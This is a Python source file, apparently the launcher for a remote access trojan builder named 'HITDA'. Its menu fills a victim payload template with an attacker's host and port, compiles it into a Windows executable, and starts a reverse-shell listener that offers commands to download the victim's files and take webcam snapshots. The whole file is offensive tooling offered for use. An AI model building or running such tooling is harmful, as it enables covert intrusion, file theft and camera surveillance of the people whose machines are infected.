import sys
import subprocess
from pyfiglet import figlet_format
import os
import Module.listening as listen


class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def banner():
    print(bcolors.RED + "[*] Starting HitD..." + bcolors.ENDC)
    print(bcolors.RED + "[+] Init Success\n\n" + bcolors.ENDC)
    bann = figlet_format(' HITDA', font='starwars')
    print(bcolors.RED + bcolors.BOLD + bann + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.RED + "author: HalukShan" + bcolors.ENDC)


def show_menu():
    menu = " =========================================================\n"
    menu += "||                     " + bcolors.OCRA + "Menu Option" + bcolors.ENDC + "                       ||\n"
    menu += "||                                                       ||\n"
    menu += "|| [" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate Script                                   ||\n"
    menu += "|| [" + bcolors.OCRA + "1" + bcolors.ENDC + "] Start Listening                                   ||\n"
    menu += "|| [" + bcolors.OCRA + "9" + bcolors.ENDC + "] Exit                                              ||\n"
    menu += " =========================================================\n"

    print(menu)


def select():
    sel = input("> Select Option: ")
    if sel == '0':
        generate_script()
    elif sel == '1':
        start_listening()
    else:
        print("Wrong Syntax!")
        select()


def generate_script():
    menu = " ========================================================\n"
    menu += "The script is running on windows 64bit        \n"
    menu += "Generate with camera function will make the exe filesize increase to about 50M \n\n"
    menu += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate with camera snapshot function\n"
    menu += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate without camera snapshot function\n"
    menu += "========================================================\n"
    print(menu)
    sel = input("> Select Option: ")
    if sel == '0':
        while True:
            host = input("Please input your listening host: ")
            port = input("Please input your listening port: ")
            confirm = input(f"Your listening host: {host}, port: {port}, (Y/N)")
            if confirm.lower() == "y":
                break
            else:
                continue
        with open("Module/victim_cam.py", "r+") as f:
            s = f.read()
            f.seek(0, 0)
            fs = open("tmp.py", "w")
            fs.write(s.replace("$HOST$", host).replace("\"$PORT$\"", port))
            fs.close()
    elif sel == '1':
        while True:
            host = input("Please input your listening host: ")
            port = input("Please input your listening port: ")
            confirm = input(f"Your listening host: {host}, port: {port}, (Y/N)")
            if confirm.lower() == "y":
                break
            else:
                continue
        with open("Module/victim.py", "r+") as f:
            s = f.read()
            f.seek(0, 0)
            fs = open("tmp.py", "w")
            fs.write(s.replace("$HOST$", host).replace("\"$PORT$\"", port))
            fs.close()
    else:
        print("Wrong Syntax!")
        generate_script()

    try:
        s = subprocess.Popen("pyinstaller -F tmp.py", shell=True, stdout=subprocess.PIPE)
        output, err = s.communicate()
        print(output.decode() if output else "" + "\n" + err.decode() if err else "")
        if not os.path.exists("docker-pyinstaller/src"):
            os.mkdir("./docker-pyinstaller/src/")
        subprocess.Popen("mv tmp.spec ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).communicate()
        subprocess.Popen("mv tmp.py ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).communicate()
        os.chdir("docker-pyinstaller/src")
        subprocess.Popen("pipreqs ./ --force", shell=True, stdout=subprocess.PIPE).communicate()
        subprocess.Popen("docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows", shell=True, stdout=subprocess.PIPE).communicate()
        print("Sucess generate! The exe file path is ./docker-pyinstaller/src/dist/windows. "
              "You can change file name by yourself.")
        banner()
        show_menu()
        select()
    except:
        print("[-] Error. Maybe you are missing some dependencies. "
              "Please check if you have install pyinstaller, docker, or pipreqs."
              "Check if the current path has ./docker-pyinstaller")


def start_listening():
    while True:
        host = input("Please input listening host: ")
        port = input("Please input listening port: ")
        confirm = input(f"Your listening host: {host}, port: {port}, (Y/N)")
        if confirm.lower() == "y":
            break
        else:
            continue
    menu = "=========================================================\n"
    menu += "The Listening mode is base on Reverse Shell        \n"
    menu += "You can use some extra command below \n\n"
    menu += bcolors.GREEN + "download <remote filename> <local filename>\n" + bcolors.ENDC
    menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
    menu += "========================================================\n"
    print(menu)
    l = listen.Listening(host, int(port))
    l.run()


if __name__ == '__main__':
    banner()
    show_menu()
    select()
